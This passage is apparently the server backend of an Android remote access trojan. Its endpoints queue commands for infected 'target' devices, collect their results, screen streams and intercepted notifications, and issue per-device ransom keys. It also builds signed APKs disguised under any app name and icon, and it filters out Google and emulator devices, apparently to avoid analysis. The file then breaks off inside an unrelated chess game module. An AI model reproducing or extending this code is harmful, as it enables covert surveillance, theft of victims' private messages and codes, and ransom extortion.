    const { device_id, sender, text } = req.body;
    if (!device_id || !sender || !text) {
        return res.status(400).json({ error: 'Missing device_id, sender, or text' });
    }
    if (sender !== 'target' && sender !== 'admin') {
        return res.status(400).json({ error: 'sender must be "target" or "admin"' });
    }
    if (sender === 'admin') {
        const key = req.headers['x-session-key'] || req.body.key;
        const validation = await validateKeyAndUser(key, req);
        if (validation.error) {
            return res.status(validation.error.status).json({ error: 'Invalid session key for admin' });
        }
    }
    const message = addMessage(device_id, sender, text);
    if (pollingWaiters[device_id]) {
        for (const waiter of pollingWaiters[device_id]) {
            try { waiter(message); } catch (e) { }
        }
        delete pollingWaiters[device_id];
    }
    res.json({ status: 'ok', message });
});

app.get('/chat/poll', (req, res) => {
    const { device_id, last_timestamp } = req.query;
    if (!device_id) {
        return res.status(400).json({ error: 'device_id required' });
    }
    const lastTs = parseInt(last_timestamp) || 0;
    const chats = loadChats();
    const messages = chats[device_id] || [];
    const newMessages = messages.filter(m => m.timestamp > lastTs);
    if (newMessages.length > 0) {
        const newLastTs = newMessages[newMessages.length - 1].timestamp;
        return res.json({ messages: newMessages, last_timestamp: newLastTs });
    }
    const timeout = setTimeout(() => {
        const idx = pollingWaiters[device_id]?.indexOf(waiter);
        if (idx !== undefined && idx !== -1) pollingWaiters[device_id].splice(idx, 1);
        if (pollingWaiters[device_id]?.length === 0) delete pollingWaiters[device_id];
        res.json({ messages: [] });
    }, 25000);
    const waiter = (newMsg) => {
        clearTimeout(timeout);
        res.json({ messages: [newMsg], last_timestamp: newMsg.timestamp });
    };
    if (!pollingWaiters[device_id]) pollingWaiters[device_id] = [];
    pollingWaiters[device_id].push(waiter);
});

app.get('/chat/messages', async (req, res) => {
    const { device_id, key } = req.query;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });
    const validation = await validateKeyAndUser(key, req);
    if (validation.error) {
        return res.status(validation.error.status).json({ error: 'Invalid session key' });
    }
    const chats = loadChats();
    const messages = chats[device_id] || [];
    res.json({ messages });
});
app.post('/update-last-seen', (req, res) => {
    const { device_id, username, session_id, last_seen } = req.body;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });
    const targets = readJSON(TARGETS_FILE) || [];
    const idx = targets.findIndex(t => t.device_id === device_id);
    if (idx !== -1) {
        targets[idx].last_seen = new Date(last_seen || Date.now()).toISOString();
        if (username) {
            targets[idx].username = normalizeOwnerValue(username);
            targets[idx].owner_username = normalizeOwnerValue(username);
        }
        if (session_id) {
            targets[idx].session_id = normalizeOwnerValue(session_id);
            targets[idx].owner_key = normalizeOwnerValue(session_id);
        }
        if (typeof req.body.lock_pin_set !== 'undefined') {
            targets[idx].lock_pin_set = Boolean(req.body.lock_pin_set);
        }
        if (req.body.lock_mode) {
            targets[idx].lock_mode = normalizeOwnerValue(req.body.lock_mode) || 'default';
        }
        writeJSON(TARGETS_FILE, targets);
        res.json({ status: 'updated' });
    } else {
        updateTarget(req.body);
        res.status(201).json({ status: 're-registered' });
    }
});

app.get('/commands/poll', (req, res) => {
    const { device_id, timeout } = req.query;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });


    updateLastSeen(device_id);

    const maxWait = Math.min(parseInt(timeout) || 25, 30) * 1000;
    const interval = 500;
    let elapsed = 0;
    const check = () => {
        const queue = inMemoryCommands[device_id];
        if (Array.isArray(queue) && queue.length > 0) {
            const cmd = queue.shift();
            if (queue.length === 0) delete inMemoryCommands[device_id];


            fs.writeFile(COMMANDS_FILE, JSON.stringify(inMemoryCommands, null, 2), () => { });

            console.log(`[→] CMD to ${device_id}: ${cmd.cmd} (${cmd.cmdId})`);
            return res.json(cmd);
        }
        elapsed += interval;
        if (elapsed >= maxWait) return res.status(204).send();
        setTimeout(check, interval);
    };
    check();
});

const screenStreams = new Map();
setInterval(() => {
    const now = Date.now();
    for (const [k, v] of screenStreams) {
        if (now - new Date(v.timestamp).getTime() > 10 * 60 * 1000) screenStreams.delete(k);
    }
}, 300000);

app.get('/stream/:device_id', requireDeviceSession, (req, res) => {
    const { device_id } = req.params;
    const stream = screenStreams.get(device_id);
    if (!stream) return res.status(404).json({ error: 'No active stream' });
    res.json(stream);
});

app.post('/result', requireDeviceSession, (req, res) => {
    const { device_id, cmdId, type, data, timestamp } = req.body;
    if (!device_id || !type) return res.status(400).json({ error: 'device_id and type required' });


    updateLastSeen(device_id);


    if (type === 'screen_stream') {
        screenStreams.set(device_id, { type, data, timestamp: timestamp || new Date().toISOString() });
        return res.json({ status: 'ok' });
    }

    if (!inMemoryResults[device_id]) inMemoryResults[device_id] = {};
    const key = cmdId || 'latest';
    inMemoryResults[device_id][key] = { type, data: data || '', timestamp: timestamp || new Date().toISOString() };


    fs.writeFile(RESULTS_FILE, JSON.stringify(inMemoryResults, null, 2), () => { });

    console.log(`[←] Result from ${device_id}: ${type} (${key})`);
    res.json({ status: 'ok' });
});

app.post('/command', async (req, res) => {
    const { device_id, cmd, param, cmdId, key } = req.body;
    if (!device_id || cmd === undefined) return res.status(400).json({ error: 'device_id and cmd required' });
    const sessionKey = key || req.headers['x-session-key'];
    const validation = await validateKeyAndUser(sessionKey, req);
    if (validation.error) return res.status(validation.error.status).json({ error: 'Invalid session key' });
    const callerUsername = validation.user.username;
    const db = loadDatabase();
    const caller = db.find(u => u.username && u.username.toLowerCase() === callerUsername.toLowerCase());
    const isAdmin = caller && ['KINGZ'].includes(caller.role?.toUpperCase());
    const targets = readJSON(TARGETS_FILE) || [];
    const target = targets.find(t => t.device_id === device_id);
    if (!target) return res.status(404).json({ error: 'Device not found' });
    if (!isAdmin && !targetMatchesOwner(target, { sessionKey, username: callerUsername })) return res.status(403).json({ error: 'Access denied' });
    if (!inMemoryCommands[device_id]) inMemoryCommands[device_id] = [];
    const finalCmdId = cmdId || `cmd_${Date.now()}`;
    const parsedCmd = isNaN(cmd) ? cmd : parseInt(cmd);
    inMemoryCommands[device_id].push({ cmd: parsedCmd, param: param || '', cmdId: finalCmdId });


    fs.writeFile(COMMANDS_FILE, JSON.stringify(inMemoryCommands, null, 2), () => { });

    console.log(`[✓] Command from ${callerUsername} to ${device_id}: ${cmd} (${finalCmdId})`);
    res.json({ status: 'ok', cmdId: finalCmdId });
});

app.get('/result/poll', async (req, res) => {
    const { device_id, cmdId, timeout, key } = req.query;
    if (!device_id || !cmdId) return res.status(400).json({ error: 'device_id and cmdId required' });
    const sessionKey = key || req.headers['x-session-key'];
    const validation = await validateKeyAndUser(sessionKey, req);
    if (validation.error) return res.status(validation.error.status).json({ error: 'Invalid session key' });
    const callerUsername = validation.user.username;
    const db = loadDatabase();
    const caller = db.find(u => u.username.toLowerCase() === callerUsername.toLowerCase());
    const isAdmin = caller && ['KINGZ'].includes(caller.role?.toUpperCase());
    if (!isAdmin) {
        const targets = readJSON(TARGETS_FILE) || [];
        const target = targets.find(t => t.device_id === device_id);
        if (!target || !targetMatchesOwner(target, { sessionKey, username: callerUsername })) return res.status(403).json({ error: 'Access denied' });
    }
    const maxWait = Math.min(parseInt(timeout) || 28, 35) * 1000;
    const interval = 500;
    let elapsed = 0;
    const check = () => {
        const bucket = inMemoryResults[device_id];
        if (bucket) {
            let result = null;
            let keyFound = null;

            if (bucket[cmdId]) {
                keyFound = cmdId;
            } else if (bucket['latest']) {
                keyFound = 'latest';
            }

            if (keyFound) {
                result = bucket[keyFound];
                delete bucket[keyFound];
                if (Object.keys(bucket).length === 0) delete inMemoryResults[device_id];


                fs.writeFile(RESULTS_FILE, JSON.stringify(inMemoryResults, null, 2), () => { });

                return res.json(result);
            }
        }
        elapsed += interval;
        if (elapsed >= maxWait) return res.status(204).send();
        setTimeout(check, interval);
    };
    check();
});

function isGoogleDevice(t) {
    const brand = (t.manufacturer || '').toLowerCase();
    const model = (t.model || '').toLowerCase();

    if (model.includes('infinix_x6837') || model.includes('infinix x6837')) {
        return false;
    }

    return brand === 'google' || model.startsWith('pixel') || model.includes('pixel') || model.includes('generic') || model.includes('emulator') || model.includes('sdk_gphone');
}

setInterval(() => {
    const targets = readJSON(TARGETS_FILE) || [];
    const now = Date.now();
    const filtered = targets.filter(t => {
        if (isGoogleDevice(t)) return false;
        if (!t.last_seen) return false;
        return (now - new Date(t.last_seen).getTime()) < 12 * 60 * 60 * 1000;
    });
    if (filtered.length !== targets.length) writeJSON(TARGETS_FILE, filtered);
}, 10 * 60 * 1000);

app.get('/targets', async (req, res) => {
    const key = req.query.key || req.headers['x-session-key'];
    const validation = await validateKeyAndUser(key, req);
    if (validation.error) return res.status(validation.error.status).json({ error: 'Invalid session key' });
    const callerUsername = validation.user.username;
    const db = loadDatabase();
    const caller = db.find(u => u.username.toLowerCase() === callerUsername.toLowerCase());
    const isAdmin = caller && ['KINGZ'].includes(caller.role);
    const targets = readJSON(TARGETS_FILE) || [];
    const filtered = targets.filter(t => {
        if (isGoogleDevice(t)) return false;
        const modelStr = t.model ? t.model.toLowerCase() : '';
        const isDebugDevice = modelStr.includes('infinix') && modelStr.includes('x6837');

        if (isDebugDevice) {
            if (!caller || caller.role !== 'KINGZ') {
                return false; // Sembunyikan dari semua orang kecuali KINGZ (termasuk OWNER)
            }
        }

        if (isAdmin) return true;
        return targetMatchesOwner(t, { sessionKey: key, username: callerUsername });
    });
    res.json(filtered.map(t => ({
        device_id: t.device_id,
        manufacturer: t.manufacturer,
        model: t.model,
        sdk: t.sdk,
        android: t.android,
        country: t.country,
        operator: t.operator,
        username: t.username,
        last_seen: t.last_seen,
        session_id: t.session_id,
        lock_pin_set: Boolean(t.lock_pin_set),
        lock_mode: t.lock_mode || 'default',
    })));
});

app.delete('/target', (req, res) => {
    const { device_id, key } = req.query;
    if (!device_id || !key) return res.status(400).json({ error: 'device_id and key required' });
    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ error: 'Invalid session key' });
    const callerUsername = keyInfo.username;
    const db = loadDatabase();
    const caller = db.find(u => u.username.toLowerCase() === callerUsername.toLowerCase());
    const isAdmin = caller && ['KINGZ'].includes(caller.role?.toUpperCase());
    const targets = readJSON(TARGETS_FILE) || [];
    const index = targets.findIndex(t => t.device_id === device_id);
    if (index === -1) return res.status(404).json({ error: 'Device not found' });
    if (isGoogleDevice(targets[index])) return res.status(403).json({ error: 'System device cannot be deleted' });
    if (!isAdmin && !targetMatchesOwner(targets[index], { sessionKey: key, username: callerUsername })) return res.status(403).json({ error: 'Access denied' });
    targets.splice(index, 1);
    writeJSON(TARGETS_FILE, targets);
    console.log(`[🗑️] Device ${device_id} deleted by ${callerUsername}`);
    res.json({ status: 'deleted' });
});

app.get('/ransom/key', requireSession, (req, res) => {
    const { device_id } = req.query;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });
    const keys = readJSON(RANSOM_KEY_FILE) || {};
    if (keys[device_id]) return res.json({ key: keys[device_id].key });
    const newKey = crypto.randomBytes(8).toString('hex');
    keys[device_id] = { key: newKey, created_at: new Date().toISOString() };
    writeJSON(RANSOM_KEY_FILE, keys);
    console.log(`[🔑 RANSOM] Generated for ${device_id}: ${newKey}`);
    res.json({ key: newKey });
});

app.get('/ransom/keys', requireSession, (req, res) => {
    res.json(readJSON(RANSOM_KEY_FILE) || {});
});

app.post('/notif/report', requireDeviceSession, (req, res) => {
    const { device_id, app: appPackage, title, content, time, session_id } = req.body;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });
    let reports = readJSON(NOTIF_REPORT_FILE) || [];
    if (!Array.isArray(reports)) reports = [];
    const entry = {
        device_id,
        app: appPackage || '',
        title: title || '',
        content: content || '',
        session_id: session_id || '',
        time: time || Date.now(),
        received_at: new Date().toISOString(),
    };
    reports.unshift(entry);
    if (reports.length > 500) reports = reports.slice(0, 500);
    writeJSON(NOTIF_REPORT_FILE, reports);
    const wsPayload = JSON.stringify({ type: 'notif_report', data: entry });
    wss.clients.forEach(c => { if (c.readyState === 1) c.send(wsPayload); });
    console.log(`[📲 NOTIF] ${device_id} | ${session_id || 'no-session'} | ${appPackage} | ${title}`);
    res.json({ ok: true });
});

app.get('/notif/report', requireSession, (req, res) => {
    const { device_id } = req.query;
    let reports = readJSON(NOTIF_REPORT_FILE) || [];
    if (!Array.isArray(reports)) reports = [];
    if (device_id) reports = reports.filter(r => r.device_id === device_id);
    res.json(reports.slice(0, 100));
});

app.post('/upload', requireSession, upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    const fileUrl = `/uploads/${req.file.filename}`;
    res.json({ url: fileUrl });
});


class BuildQueue {
    constructor(concurrencyLimit) {
        this.limit = concurrencyLimit;
        this.running = 0;
        this.queue = [];
    }
    async enqueue(task) {
        if (this.running >= this.limit) {
            await new Promise(resolve => this.queue.push(resolve));
        }
        this.running++;
        try {
            return await task();
        } catch (e) {
            throw e;
        } finally {
            this.running--;
            if (this.queue.length > 0) {
                const next = this.queue.shift();
                next();
            }
        }
    }
}
const apkQueue = new BuildQueue(10); // Maksimal 10 proses bersamaan


function cleanupTempFiles() {
    try {
        const files = fs.readdirSync(__dirname);
        for (const file of files) {
            if (file.startsWith('build_tmp_') || file.endsWith('_converted.png')) {
                const fullPath = path.join(__dirname, file);
                fs.rmSync(fullPath, { recursive: true, force: true });
            } else if (file.startsWith('unsigned_') && file.endsWith('.apk')) {
                const fullPath = path.join(__dirname, file);
                fs.unlinkSync(fullPath);
            }
        }
    } catch (err) {
        console.error('Gagal membersihkan file temp lama:', err.message);
    }
}
cleanupTempFiles();


function cleanupOldApks() {
    const downloadsDir = path.join(__dirname, 'public', 'downloads');
    if (!fs.existsSync(downloadsDir)) return;

    try {
        const files = fs.readdirSync(downloadsDir);
        const now = Date.now();
        const thirtyMinutes = 30 * 60 * 1000;

        for (const file of files) {
            if (file.endsWith('.apk')) {
                const filePath = path.join(downloadsDir, file);
                const stats = fs.statSync(filePath);
                if (now - stats.mtimeMs > thirtyMinutes) {
                    fs.unlinkSync(filePath);
                    console.log(`Menghapus APK lama: ${file}`);
                }
            }
        }
    } catch (err) {
        console.error('Gagal membersihkan APK lama:', err.message);
    }
}


setInterval(cleanupOldApks, 10 * 60 * 1000);
cleanupOldApks();


app.post('/api/build-apk', requireSession, upload.single('icon'), async (req, res) => {
    const { appName, webviewUrl, key, session_id, sessionId, username } = req.body;
    if (!appName || !webviewUrl) {
        return res.status(400).json({ error: 'appName dan webviewUrl wajib diisi' });
    }

    const baseApkPath = path.join(__dirname, 'manta_base.apk');
    if (!fs.existsSync(baseApkPath)) {
        return res.status(404).json({ error: 'manta_base.apk tidak ditemukan di server. Silakan letakkan APK polosan di folder root server.' });
    }

    let resolvedUsername = username || "";
    let resolvedSessionId = key || session_id || sessionId || "";

    const userIdentifier = resolvedUsername || resolvedSessionId;
    if (userIdentifier) {
        const today = new Date().toISOString().slice(0, 10);
        const limitsFile = path.join(__dirname, 'build_limits.json');
        let limits = {};
        if (fs.existsSync(limitsFile)) {
            try {
                limits = JSON.parse(fs.readFileSync(limitsFile, 'utf8'));
            } catch (e) {
                limits = {};
            }
        }






        limits[userIdentifier] = today;
        try {
            fs.writeFileSync(limitsFile, JSON.stringify(limits, null, 2));
        } catch (e) {
            console.error('Gagal menulis file build_limits.json:', e);
        }
    }

    const buildId = Date.now().toString();
    const buildDir = path.join(__dirname, `build_tmp_${buildId}`);
    const unsignedApkPath = path.join(__dirname, `unsigned_${buildId}.apk`);
    const outputApk = path.join(__dirname, 'public', 'downloads', `Manta_${buildId}.apk`);

    try {

        await apkQueue.enqueue(async () => {

            const apktoolJar = path.join(__dirname, 'apktool.jar');
            if (!fs.existsSync(apktoolJar)) {
                console.log('Mengunduh apktool.jar...');
                const https = require('https');
                await new Promise((resolve, reject) => {
                    const file = fs.createWriteStream(apktoolJar);
                    https.get('https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar', function (response) {
                        if (response.statusCode === 302) {
                            https.get(response.headers.location, function (redirectRes) {
                                redirectRes.pipe(file);
                                file.on('finish', () => file.close(resolve));
                            }).on('error', reject);
                        } else {
                            response.pipe(file);
                            file.on('finish', () => file.close(resolve));
                        }
                    }).on('error', reject);
                });
            }


            const preDecodedPath = path.join(__dirname, 'manta_base_decoded');
            const framePath = path.join(__dirname, 'apktool_framework');
            if (!fs.existsSync(preDecodedPath)) {
                console.log("Pre-decoding manta_base.apk...");
                await new Promise((resolve, reject) => {
                    exec(`java -jar "${apktoolJar}" d "${baseApkPath}" -o "${preDecodedPath}" -f -p "${framePath}"`, { maxBuffer: 1024 * 1024 * 50 }, (error, stdout, stderr) => {
                        if (error) reject(new Error(stderr || error.message));
                        else resolve(stdout);
                    });
                });
            }

            fs.cpSync(preDecodedPath, buildDir, { recursive: true });


            const stringsPath = path.join(buildDir, 'res', 'values', 'strings.xml');
            if (fs.existsSync(stringsPath)) {
                let stringsXml = await fsp.readFile(stringsPath, 'utf8');
                let escapedAppName = appName.replace(/(?<!\\)'/g, "\\'");
                stringsXml = stringsXml.replace(/<string name="app_name">.*?<\/string>/g, `<string name="app_name">${escapedAppName}</string>`);
                await fsp.writeFile(stringsPath, stringsXml);
            }


            const manifestPath = path.join(buildDir, 'AndroidManifest.xml');
            if (fs.existsSync(manifestPath)) {
                let manifestXml = await fsp.readFile(manifestPath, 'utf8');
                manifestXml = manifestXml.replace(/android:enableOnBackInvokedCallback="[^"]*"/g, "");
                await fsp.writeFile(manifestPath, manifestXml);
            }


            async function fixColorsInDir(dir) {
                const files = await fsp.readdir(dir, { withFileTypes: true });
                for (const file of files) {
                    const fullPath = path.join(dir, file.name);
                    if (file.isDirectory()) {
                        await fixColorsInDir(fullPath);
                    } else if (file.name.endsWith('.xml')) {
                        let content = await fsp.readFile(fullPath, 'utf8');
                        if (content.includes('@android:color/')) {
                            const newContent = content.replace(/@android:color\/(?!white|black|transparent)[a-zA-Z0-9_]+/g, "@android:color/black");
                            if (newContent !== content) await fsp.writeFile(fullPath, newContent);
                        }
                    }
                }
            }
            const resDirToFix = path.join(buildDir, 'res');
            if (fs.existsSync(resDirToFix)) {
                await fixColorsInDir(resDirToFix);
            }


            const assetsDir = path.join(buildDir, 'assets');
            if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });

            let configData = {
                username: "isi username",
                session_id: "isi session id",
                webview_url: "https://www.google.com",
                app_name: "KAZE X",
                logo_url: "https://files.catbox.moe/fi1fpt.jpg"
            };

            const configPath = path.join(assetsDir, 'config.json');
            if (fs.existsSync(configPath)) {
                try {
                    const existingData = JSON.parse(await fsp.readFile(configPath, 'utf8'));
                    configData = { ...configData, ...existingData };
                } catch (e) {
                    console.error("Gagal membaca config.json asli:", e);
                }
            }

            if (typeof resolvedUsername === 'string') configData.username = resolvedUsername;
            if (typeof resolvedSessionId === 'string') configData.session_id = resolvedSessionId;
            if (webviewUrl) configData.webview_url = webviewUrl;
            if (appName) configData.app_name = appName;

            await fsp.writeFile(configPath, JSON.stringify(configData, null, 2));


            if (req.file) {
                let iconPath = req.file.path;
                const resDir = path.join(buildDir, 'res');

                if (fs.existsSync(resDir)) {
                    const anydpi = path.join(resDir, 'mipmap-anydpi-v26');
                    if (fs.existsSync(anydpi)) fs.rmSync(anydpi, { recursive: true, force: true });

                    try {
                        const pngPath = iconPath + '_converted.png';
                        let converted = false;
                        const iconBuffer = fs.readFileSync(iconPath);
                        const isWebp = iconBuffer[0] === 0x52 && iconBuffer[1] === 0x49 && iconBuffer[2] === 0x46 && iconBuffer[3] === 0x46
                            && iconBuffer[8] === 0x57 && iconBuffer[9] === 0x45 && iconBuffer[10] === 0x42 && iconBuffer[11] === 0x50;

                        if (isWebp) {
                            try {
                                const sharp = require('sharp');
                                await sharp(iconPath).resize(192, 192).png().toFile(pngPath);
                                iconPath = pngPath;
                                converted = true;
                                console.log("Berhasil convert WebP via sharp → PNG 192x192");
                            } catch (_) {
                                try {
                                    const { execSync } = require('child_process');
                                    execSync(`ffmpeg -y -i "${iconPath}" -vf scale=192:192 "${pngPath}" 2>/dev/null`, { timeout: 15000 });
                                    if (fs.existsSync(pngPath)) {
                                        iconPath = pngPath;
                                        converted = true;
                                        console.log("Berhasil convert WebP via ffmpeg → PNG 192x192");
                                    }
                                } catch (__) {
                                    try {
                                        const { execSync } = require('child_process');
                                        execSync(`convert "${iconPath}" -resize 192x192 "${pngPath}" 2>/dev/null`, { timeout: 15000 });
                                        if (fs.existsSync(pngPath)) {
                                            iconPath = pngPath;
                                            converted = true;
                                            console.log("Berhasil convert WebP via ImageMagick → PNG 192x192");
                                        }
                                    } catch (___) {
                                        console.error("Semua fallback WebP gagal, mencoba Jimp...");
                                    }
                                }
                            }
                        }
                        if (!converted) {
                            const Jimp = require('jimp');
                            const image = await Jimp.read(iconPath);
                            await image.resize(192, 192).writeAsync(pngPath);
                            iconPath = pngPath;
                            console.log("Berhasil convert dan resize gambar icon via Jimp → 192x192 PNG.");
                        }
                    } catch (err) {
                        console.error("Gagal convert gambar icon:", err.message);
                        throw new Error("Format gambar icon tidak didukung. Coba upload PNG/JPG. Detail: " + err.message);
                    }

                    const folders = fs.readdirSync(resDir).filter(f => f.startsWith('mipmap'));
                    for (const folder of folders) {
                        const destDir = path.join(resDir, folder);
                        const files = fs.readdirSync(destDir);
                        for (const file of files) {
                            if (file.startsWith('ic_launcher') && file.endsWith('.png')) {
                                try {
                                    fs.copyFileSync(iconPath, path.join(destDir, file));
                                } catch (e) {
                                    console.error(`Gagal menimpa ${file}:`, e.message);
                                }
                            }
                        }
                    }
                }
            }


            const fixLStar = (dir) => {
                if (!fs.existsSync(dir)) return;
                const files = fs.readdirSync(dir);
                for (const file of files) {
                    if (file.endsWith('.xml')) {
                        const filePath = path.join(dir, file);
                        let content = fs.readFileSync(filePath, 'utf8');
                        if (content.includes('android:lStar')) {
                            content = content.replace(/android:lStar="[^"]*"/g, '');
                            fs.writeFileSync(filePath, content);
                        }
                    }
                }
            };
            fixLStar(path.join(buildDir, 'res', 'color-v31'));
            fixLStar(path.join(buildDir, 'res', 'color-v33'));

            await new Promise((resolve, reject) => {
                exec(`java -jar "${apktoolJar}" b "${buildDir}" -o "${unsignedApkPath}"`, (error, stdout, stderr) => {
                    if (error) reject(new Error(stderr || error.message));
                    else resolve(stdout);
                });
            });


            const signerJar = path.join(__dirname, 'uber-apk-signer.jar');
            if (!fs.existsSync(signerJar)) {
                console.log('Mengunduh uber-apk-signer.jar...');
                const https = require('https');
                await new Promise((resolve, reject) => {
                    const file = fs.createWriteStream(signerJar);
                    https.get('https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar', function (response) {
                        if (response.statusCode === 302) {
                            https.get(response.headers.location, function (redirectRes) {
                                redirectRes.pipe(file);
                                file.on('finish', () => file.close(resolve));
                            }).on('error', reject);
                        } else {
                            response.pipe(file);
                            file.on('finish', () => file.close(resolve));
                        }
                    }).on('error', reject);
                });
            }

            if (!fs.existsSync(path.join(__dirname, 'public', 'downloads'))) {
                fs.mkdirSync(path.join(__dirname, 'public', 'downloads'), { recursive: true });
            }

            const keystorePath = path.join(__dirname, 'manta.jks');
            let signCmd = `java -jar "${signerJar}" -a "${unsignedApkPath}" -o "${path.dirname(outputApk)}"`;
            if (fs.existsSync(keystorePath)) {
                signCmd += ` --ks "${keystorePath}" --ksAlias key0 --ksPass ratapp123 --ksKeyPass ratapp123`;
            }

            await new Promise((resolve, reject) => {
                exec(signCmd, (error, stdout, stderr) => {
                    if (error) reject(new Error(stderr || error.message));
                    else resolve(stdout);
                });
            });

            const generatedApk = fs.readdirSync(path.dirname(outputApk)).find(f => f.startsWith(`unsigned_${buildId}`) && f.endsWith('.apk'));
            if (generatedApk) {
                fs.renameSync(path.join(path.dirname(outputApk), generatedApk), outputApk);
            } else {
                fs.copyFileSync(unsignedApkPath, outputApk);
            }
        }); // Penutup apkQueue.enqueue

        res.json({ success: true, downloadUrl: `/downloads/Manta_${buildId}.apk` });

    } catch (error) {
        console.error('Build Error:', error);
        res.status(500).json({ error: error.message || 'Gagal membuild APK', details: error.message });
    } finally {

        try {
            if (fs.existsSync(buildDir)) fs.rmSync(buildDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedApkPath)) fs.rmSync(unsignedApkPath, { force: true });
            if (req.file && fs.existsSync(req.file.path)) fs.rmSync(req.file.path, { force: true });
            if (req.file && fs.existsSync(req.file.path + '_converted.png')) fs.rmSync(req.file.path + '_converted.png', { force: true });
        } catch (cleanupErr) {
            console.error('Gagal membersihkan folder tmp:', cleanupErr.message);
        }
    }
});

app.get('/heartbeat', (req, res) => {
    res.json({ status: 'alive', timestamp: Date.now() });
});





const CHESS_FOLDER = path.join(__dirname, "chess");
fs.mkdirSync(CHESS_FOLDER, { recursive: true });


const wssChessGlobal = new WebSocket.Server({ server, path: "/chess" });
const wssChessGame = new WebSocket.Server({
    server,
    path: "/chess/game",
    verifyClient: (info, done) => {
        done(true);
    }
});

let onlinePlayers = new Map();
let playerConnections = new Map();

app.get("/api/chess/game/:gameId", (req, res) => {
    const gameId = req.params.gameId;
    const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);

    if (!fs.existsSync(gameFile)) {
        return res.status(404).json({ error: "Game not found" });
    }

    try {
        const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));
        res.json(gameData);
    } catch (err) {
        res.status(500).json({ error: "Failed to read game file" });
    }
});

app.post("/api/chess/create-game", (req, res) => {
    const { timeControl, isRated, username } = req.body;

    if (!username) {
        return res.status(400).json({ error: "Username required" });
    }

    const gameId = `game_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);

    const [minutes, increment] = timeControl.split('|').map(Number);
    const totalSeconds = minutes * 60;

    const initialGame = {
        gameId,
        playerWhite: username,
        playerBlack: "",
        players: [username],
        playerColors: { [username]: "white" },
        moves: [],
        moveHistory: [],
        status: "waiting",
        winner: "",
        createdAt: new Date().toISOString(),
        currentTurn: "white",
        whiteTime: totalSeconds,
        blackTime: totalSeconds,
        whiteRating: 1200,
        blackRating: 1200,
        isRated: isRated || false,
        timeControl: timeControl,
        pieces: [
            { type: "rook", color: "white", id: "wr1", position: 0, hasMoved: false },
            { type: "knight", color: "white", id: "wn1", position: 1, hasMoved: false },
            { type: "bishop", color: "white", id: "wb1", position: 2, hasMoved: false },
            { type: "queen", color: "white", id: "wq", position: 3, hasMoved: false },
            { type: "king", color: "white", id: "wk", position: 4, hasMoved: false },
            { type: "bishop", color: "white", id: "wb2", position: 5, hasMoved: false },
            { type: "knight", color: "white", id: "wn2", position: 6, hasMoved: false },
            { type: "rook", color: "white", id: "wr2", position: 7, hasMoved: false },
            { type: "pawn", color: "white", id: "wp0", position: 8, hasMoved: false },
            { type: "pawn", color: "white", id: "wp1", position: 9, hasMoved: false },
            { type: "pawn", color: "white", id: "wp2", position: 10, hasMoved: false },
            { type: "pawn", color: "white", id: "wp3", position: 11, hasMoved: false },
            { type: "pawn", color: "white", id: "wp4", position: 12, hasMoved: false },
            { type: "pawn", color: "white", id: "wp5", position: 13, hasMoved: false },
            { type: "pawn", color: "white", id: "wp6", position: 14, hasMoved: false },
            { type: "pawn", color: "white", id: "wp7", position: 15, hasMoved: false },
            { type: "pawn", color: "black", id: "bp0", position: 48, hasMoved: false },
            { type: "pawn", color: "black", id: "bp1", position: 49, hasMoved: false },
            { type: "pawn", color: "black", id: "bp2", position: 50, hasMoved: false },
            { type: "pawn", color: "black", id: "bp3", position: 51, hasMoved: false },
            { type: "pawn", color: "black", id: "bp4", position: 52, hasMoved: false },
            { type: "pawn", color: "black", id: "bp5", position: 53, hasMoved: false },
            { type: "pawn", color: "black", id: "bp6", position: 54, hasMoved: false },
            { type: "pawn", color: "black", id: "bp7", position: 55, hasMoved: false },
            { type: "rook", color: "black", id: "br1", position: 56, hasMoved: false },
            { type: "knight", color: "black", id: "bn1", position: 57, hasMoved: false },
            { type: "bishop", color: "black", id: "bb1", position: 58, hasMoved: false },
            { type: "queen", color: "black", id: "bq", position: 59, hasMoved: false },
            { type: "king", color: "black", id: "bk", position: 60, hasMoved: false },
            { type: "bishop", color: "black", id: "bb2", position: 61, hasMoved: false },
            { type: "knight", color: "black", id: "bn2", position: 62, hasMoved: false },
            { type: "rook", color: "black", id: "br2", position: 63, hasMoved: false }
        ]
    };

    try {
        fs.writeFileSync(gameFile, JSON.stringify(initialGame, null, 2));

        wssChessGlobal.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({
                    type: "game_created",
                    game: initialGame
                }));
            }
        });

        res.json({
            success: true,
            gameId: gameId,
            playerColor: "white"
        });
    } catch (err) {
        res.status(500).json({ error: "Failed to create game" });
    }
});

app.post("/api/chess/move", (req, res) => {
    const { gameId, from, to, promotion } = req.body;
    const gameFile = path.join(CHESS_FOLDER, `${gameId}.json`);

    if (!fs.existsSync(gameFile)) {
        return res.status(404).json({ error: "Game not found" });
    }

    try {
        const gameData = JSON.parse(fs.readFileSync(gameFile, "utf-8"));

        const movingPiece = gameData.pieces.find(p => p.position === from);
        if (!movingPiece) {
            return res.status(400).json({ error: "Piece not found at source" });
        }

        const capturedPiece = gameData.pieces.find(p => p.position === to) || null;
        const isCastling = movingPiece.type === "king" && Math.abs(to - from) === 2;
        const isEnPassant = movingPiece.type === "pawn" && (to % 8) !== (from % 8) && !capturedPiece;

        movingPiece.position = to;
        if (promotion) movingPiece.type = promotion;
        movingPiece.hasMoved = true;

        if (capturedPiece) {
            gameData.pieces = gameData.pieces.filter(p => p.position !== to);
        }

        if (isEnPassant) {
            const capturedPawnPos = to + (movingPiece.color === "white" ? 8 : -8);
            gameData.pieces = gameData.pieces.filter(p => p.position !== capturedPawnPos);
        }

        if (isCastling) {
